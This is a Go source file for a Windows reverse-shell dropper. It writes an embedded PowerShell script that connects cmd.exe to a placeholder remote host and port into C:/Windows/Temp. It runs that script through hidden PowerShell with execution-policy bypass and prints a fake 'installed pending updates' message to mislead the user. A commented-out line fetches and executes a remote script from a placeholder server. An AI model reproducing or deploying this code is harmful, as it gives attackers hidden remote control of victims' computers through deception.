package main

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

//Remote host
const REMOTEHOST = "RHOST"

//Remote Port
const REMOTEPORT = "RPORT"

var (
	err                     error
	powershellcore, cmdname string
)

func init() {
	powershellcore = `function cleanup {
		if ($client.Connected -eq $true) {$client.Close()}
		if ($process.ExitCode -ne $null) {$process.Close()}
		exit}
		// Setup IPADDR
		$address = 'REVIP'
		// Setup PORT
		$port = 'REVPORT'
		$client = New-Object system.net.sockets.tcpclient
		$client.connect($address,$port)
		$stream = $client.GetStream()
		$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
		$process = New-Object System.Diagnostics.Process
		$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
		$process.StartInfo.RedirectStandardInput = 1
		$process.StartInfo.RedirectStandardOutput = 1
		$process.StartInfo.UseShellExecute = 0
		$process.Start()
		$inputstream = $process.StandardInput
		$outputstream = $process.StandardOutput
		Start-Sleep 1
		$encoding = new-object System.Text.AsciiEncoding
		while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
		$stream.Write($encoding.GetBytes($out),0,$out.Length)
		$out = $null; $done = $false; 
		while (-not $done) {
		if ($client.Connected -ne $true) {cleanup}
		$pos = 0; $i = 1
		while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
		$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
		$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
		if ($pos -gt 0) {
		$string = $encoding.GetString($networkbuffer,0,$pos)
		$inputstream.write($string)
		start-sleep 1
		if ($process.ExitCode -ne $null) {cleanup}
		else {
		$out = $encoding.GetString($outputstream.Read())
		while($outputstream.Peek() -ne -1){
		$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
		$stream.Write($encoding.GetBytes($out),0,$out.length)
		$out = $null
		$string = $null}} else {cleanup}}`
}

func os64check() bool {

	for _, e := range os.Environ() {
		pair := strings.Split(e, "=")

		if pair[0] == "PROCESSOR_ARCHITEW6432" || strings.Contains(pair[1], "64") {
			fmt.Println(pair[0] + "=" + pair[1])
			return true
		}
	}
	return false
}

func main() {
	genereaterevshellscript(REMOTEHOST, REMOTEPORT)
	if os64check() {
		//fmt.Println("64 bit")
		cmdname = `c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`

	} else {

		cmdname = "PowerShell"
	}

	//cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX ((new-object net.webclient).downloadstring('http://SERVERIP/outfiles/revpshell.ps1'))"}
	cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", `IEX (C:/Windows/Temp/powrev.ps1)`}
	cmd := exec.Command(cmdname, cmdArgs...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	err := cmd.Start()
	checkerr(err)
	fmt.Println("Successfully installed pending updates !")
}

func genereaterevshellscript(ip, port string) {
	ipreplaced := strings.Replace(powershellcore, "REVIP", ip, 1)
	portreplaced := strings.Replace(ipreplaced, "REVPORT", port, 1)
	fopowershellrevshell, err := os.Create(`C:/Windows/Temp/powrev.ps1`)
	checkerr(err)
	defer fopowershellrevshell.Close()
	fopowershellrevshell.WriteString(portreplaced)
}

func checkerr(err error) {
	if err != nil {
		fmt.Printf("something went wrong %s", err)
		return
	}
}
